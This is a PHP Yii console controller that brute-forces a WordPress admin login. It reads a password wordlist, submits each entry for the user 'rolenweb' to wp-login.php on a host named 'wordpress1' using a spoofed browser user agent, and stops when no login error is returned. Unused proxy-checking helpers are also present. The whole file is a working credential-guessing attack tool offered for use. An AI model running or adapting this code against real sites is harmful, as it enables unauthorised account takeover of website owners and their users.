<?php
namespace console\controllers;

use yii;
use yii\console\Controller;
use yii\db\Query;
use yii\helpers\Console;

use common\models\socks\Socks;

use console\tools\CurlClient;
use console\tools\SymfonyParser;
use Symfony\Component\DomCrawler\Link;


class BFWPController extends Controller
{
    
    const URL = 'http://checkproxy.devsym.ru/';

    public function actionIndex()
    {

        $pass_file = file(Yii::getAlias('@app').'/files/bruteforse/all.txt');

        foreach ($pass_file as $key => $item) {
            self::success('Try: '.$key.' - '.$item);
            $content = $this->loginWp('rolenweb',$item,'http://wordpress1/');
            $error = $this->parseProperty($content,'string','div#login_error');
            if (empty($error) === false) {
                self::error($error[0]); 
            }else{
                self::success('YESSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS');
                break;
            }
        }
    }

    public function parseProperty($content,$type,$pattern,$url = null)
    {
        $parser = (new SymfonyParser)->in($content, (new CurlClient())->getContentType());
        $result = [];
        if ($type === 'string') {
            $nodes = $parser->find($pattern);
            if (empty($nodes) === false) {
                foreach ($nodes as $node) {
                    $result[] = $node->textContent;
                }
            }
        }
        return $result;
    }

    public function loginWp($username,$password,$url)
    {
        $url_login = $url."wp-login.php";
        $url_admin = $url.'wp-admin/';
        $ckfile = tempnam(Yii::getAlias('@app')."/cookiefile", "CURLCOOKIE");
        $useragent = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2';

        
        $f = fopen(Yii::getAlias('@app').'/cookiefile/log.txt', 'w'); // file to write request 

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url_login);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $ckfile);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $ckfile);
        curl_setopt($ch, CURLOPT_HEADER, FALSE);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_REFERER, $url);
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_STDERR, $f);
        curl_setopt($ch, CURLOPT_USERAGENT, $useragent);

        // Collecting all POST fields
        $postfields = array();
        
        $postfields['log'] = $username;
        $postfields['pwd'] = $password;
        $postfields['wp-submit'] = 'Log in';
        $postfields['redirect_to'] = $url_admin;
        //$postfields['testcookie'] = '1';
        

        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postfields);
        $ret = curl_exec($ch); // Get result after login page.
        curl_close($ch);
        return $ret;
    }

    public function status($url,$type,$ip,$port)
    {   
        $content = (new CurlClient())->setUrl($url)->getContentWithInfo($type,$ip,$port);
        
        if (empty($content['info']['http_code']) === false) {
            return $content['info']['http_code'];
        }
        return;
    }

    public function getType($type)
    {
        if (stripos($type,'socks4') !== false) {
                return 'socks4';
        }
            if (stripos($type,'socks5') !== false) {
                return 'socks5';
            }
    }

    protected static function success($message)
    {
        Console::output(Console::ansiFormat($message, [Console::FG_GREEN]));
    }

    protected static function error($message)
    {
        Console::output(Console::ansiFormat($message, [Console::FG_RED]));
    }
}
?>